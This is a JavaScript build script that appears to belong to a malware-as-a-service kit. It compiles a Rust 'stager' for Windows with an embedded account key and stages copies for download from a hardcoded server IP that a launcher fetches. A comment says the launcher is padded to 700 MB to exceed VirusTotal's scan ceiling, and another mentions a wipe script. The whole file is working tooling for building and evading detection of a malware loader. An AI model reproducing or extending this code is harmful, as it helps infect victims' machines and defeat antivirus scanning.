// language: JavaScript, file: builder/rustbuild.js
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
import { compileLauncher } from './compile.js';
import { zipPaddedExe } from './zip.js';

const execFileP = promisify(execFile);
const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT_DIR = path.join(__dirname, '..');
const DOWNLOAD_DIR = path.join(ROOT_DIR, 'download');

// padded size of the delivered launcher exe — exceeds VT's scan ceiling
const PAD_TO = 700 * 1024 * 1024;

export async function buildBoot({ key, buildId }) {
  let rustDir = path.join(ROOT_DIR, 'client');
  if (!fs.existsSync(rustDir)) rustDir = ROOT_DIR;

  const srcDir = path.join(rustDir, 'src');
  if (!fs.existsSync(srcDir)) fs.mkdirSync(srcDir, { recursive: true });

  const embeddedKeyPath = path.join(srcDir, 'embedded_key.rs');
  fs.writeFileSync(embeddedKeyPath, `pub const ACCOUNT_KEY: &str = "${key}";\n`);

  console.log('[build] compiling rust stager...');
  try {
    await execFileP('cargo', ['build', '--release', '--target', 'x86_64-pc-windows-gnu'], {
      cwd: rustDir,
      timeout: 5 * 60_000,
      maxBuffer: 64 * 1024 * 1024,
    });
  } catch (e) {
    const fullLog = (e.stdout || '') + '\n' + (e.stderr || '');
    throw new Error(`cargo failed:\n${fullLog.slice(-2000)}`);
  }

  const baseExe = path.join(rustDir, 'target', 'x86_64-pc-windows-gnu', 'release', 'boot.exe');
  if (!fs.existsSync(baseExe)) throw new Error(`rust build missing output at ${baseExe}`);

  if (!fs.existsSync(DOWNLOAD_DIR)) fs.mkdirSync(DOWNLOAD_DIR, { recursive: true });

  // The C launcher hardcodes `http://<ip>/api/downloads/st.dat`. The wipe
  // script in server.js downloads `st.exe`. Both must exist on disk.
  fs.copyFileSync(baseExe, path.join(DOWNLOAD_DIR, 'st.dat'));
  fs.copyFileSync(baseExe, path.join(DOWNLOAD_DIR, 'st.exe'));

  console.log('[build] wrapping into padded launcher...');
  const launcherBuf = await compileLauncher({
    key,
    buildId,
    config: { ip: process.env.SERVER_IP || '95.182.96.216' },
    baseExe,
  });

  console.log(`[build] launcher ${launcherBuf.length} B → pad ${PAD_TO} B → zip...`);
  const zipBuf = await zipPaddedExe(launcherBuf, 'boot.exe', PAD_TO);
  console.log(`[build] zip ${zipBuf.length} B`);

  return zipBuf;
}